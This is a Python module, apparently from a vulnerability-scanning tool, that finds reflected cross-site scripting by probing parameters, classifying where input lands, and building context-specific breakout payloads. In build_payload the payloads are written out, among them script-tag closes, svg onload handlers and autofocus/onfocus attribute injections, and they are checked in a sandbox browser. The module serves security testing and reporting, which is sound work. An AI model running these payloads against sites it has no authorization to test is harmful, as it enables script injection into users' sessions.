"""Context-aware reflected XSS — don't give up after one escaped reflection.

The naive check ("inject `<x>`, is it reflected raw?") misses most real XSS: the input
often lands inside an attribute value, an inline `<script>` string, an event handler, or
an unquoted attribute, where the *right* breakout is different and `<`/`>` may be escaped
while `"`/`'` are not. This module injects a breakout probe, works out WHICH context the
reflection lands in and which metacharacters survive un-escaped, then crafts the minimal
payload for that context and confirms it executes in a real browser (agentd xss_check),
reusing the `window.__owl_xss` token protocol. Falls back to a high-signal CANDIDATE when
no browser is available but the breakout characters are reflected un-escaped.

Deterministic, bounded, model-independent — the harness does the context reasoning a weak
model would fumble.
"""

from __future__ import annotations

import secrets
from collections.abc import Callable
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

_BREAK = "<>\"'`"   # metacharacters we test for survival at the reflection point


def _inject_url(url: str, param: str, value: str) -> str:
    sp = urlsplit(url)
    q = dict(parse_qsl(sp.query))
    q[param] = value
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(q), ""))


def _reflect(sandbox, method, url, param, value, headers) -> str:
    from owlforge.engine.preprobe import _send
    return (_send(sandbox, method, url, param, value, headers) or {}).get("body") or ""


def classify(body: str, tok: str) -> tuple[str, dict] | None:
    """Locate the reflected `tok…tok` span and describe its context:
    ('html'|'tag'|'script', {survived:set, quote:'"'|"'"|None})."""
    i = body.find(tok)
    if i < 0:
        return None
    j = body.find(tok, i + len(tok))
    span = body[i + len(tok):j] if j >= 0 else ""
    survived = {c for c in _BREAK if c in span}
    pre = body[:i]
    in_script = pre.rfind("<script") > pre.rfind("</script>")
    lt, gt = pre.rfind("<"), pre.rfind(">")
    in_tag = lt > gt
    ctx = "script" if in_script else "tag" if in_tag else "html"
    # the enclosing quote comes from the script body (JS string) or the open tag (attribute)
    if ctx == "script":
        seg = pre[pre.rfind("<script"):]
        seg = seg[seg.find(">") + 1:] if ">" in seg else seg
    elif ctx == "tag":
        seg = pre[lt:]
    else:
        seg = ""
    quote = '"' if seg.count('"') % 2 == 1 else "'" if seg.count("'") % 2 == 1 else None
    return ctx, {"survived": survived, "quote": quote}


def build_payload(ctx: str, info: dict, token: str) -> str | None:
    """Minimal breakout payload for the detected context, or None if it looks un-exploitable
    (metacharacters fully escaped). The sink sets window.__owl_xss so xss_check confirms it."""
    s, q = info["survived"], info["quote"]
    sink = f"window.__owl_xss='{token}'"
    if ctx == "script":
        if q == "'" and "'" in s:
            return f"';{sink};//"
        if q == '"' and '"' in s:
            return f'";{sink};//'
        if "<" in s and ">" in s:
            return f"</script><svg onload={sink}>"
        return None
    if ctx == "tag":
        if q and q in s and "<" in s and ">" in s:
            return f"{q}><svg onload={sink}>"
        if q and q in s:                       # close the attribute, add an event handler
            return f"{q} autofocus onfocus={sink} x={q}"
        if not q:                              # unquoted attribute
            return f" autofocus onfocus={sink} x="
        return None
    # html body text
    if "<" in s and ">" in s:
        return f"<svg onload={sink}>"
    return None


def _file(assessment_id, url, param, ctx, payload, token, executed: bool, note: str):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{secrets.token_hex(5)}", assessment_id=assessment_id,
            title=f"Reflected XSS ({ctx} context)",
            severity="high", endpoint=url, method="GET",
            status="validated" if executed else "candidate",
            confidence="high" if executed else "medium",
            technical_analysis=(f"User input in '{param}' is reflected into a {ctx} context at "
                                f"{url}. {note}"),
            proof_of_concept=f"{param} = {payload}",
            evidence=f"{_inject_url(url, param, payload)}  (context={ctx}, executed={executed})",
            impact="Arbitrary script executes in the victim's browser session.",
            remediation="Context-aware output encoding for the sink; a strict CSP as defence "
                        "in depth.",
            repro_url=url, repro_method="GET", repro_params={param: payload},
            success_signal=token if executed else "",
            validation_note=f"context-aware reflected XSS ({ctx})"
                            + (" — executed in browser" if executed else " — reflected un-escaped")))
        s.commit()


def reflected_xss_scan(assessment_id: str, targets: list[dict], sandbox,
                       session_headers: dict | None = None, cap: int = 12,
                       log: Callable[[str], None] = lambda m: None) -> int:
    """Context-aware reflected-XSS sweep. Files a browser-confirmed VALIDATED finding when
    the crafted payload executes, else a CANDIDATE when the breakout survives un-escaped."""
    if sandbox is None:
        return 0
    can_browser = hasattr(sandbox, "xss_check")
    filed, probed, seen = 0, 0, set()
    for t in targets:
        if probed >= cap:
            break
        p = t.get("param")
        url = t["url"]
        if not p or (url, p) in seen:
            continue
        seen.add((url, p))
        probed += 1
        method = (t.get("method") or "GET").upper()
        tok = "owl" + secrets.token_hex(3)
        probe = f"{tok}<>\"'`{tok}"
        body = _reflect(sandbox, method, url, p, probe, session_headers)
        ctx_info = classify(body, tok)
        if ctx_info is None:
            continue
        ctx, info = ctx_info
        if not info["survived"]:
            continue   # everything escaped at the reflection point — not exploitable here
        token = "owlx" + secrets.token_hex(4)
        payload = build_payload(ctx, info, token)
        if payload is None:
            continue
        executed = False
        if can_browser:
            try:
                u = _inject_url(url, p, payload)
                executed = bool((sandbox.xss_check(u, token, headers=session_headers or None)
                                 or {}).get("executed"))
            except Exception:
                executed = False
        note = ("The crafted payload executed in a real browser."
                if executed else
                f"Breakout characters {''.join(sorted(info['survived']))} are reflected "
                "un-escaped, so a context-appropriate payload injects script.")
        _file(assessment_id, url, p, ctx, payload, token, executed, note)
        filed += 1
        log(f"reflect-xss: {p} @ {url} -> {ctx} context"
            + (" EXECUTED" if executed else " (reflected un-escaped)"))
    return filed
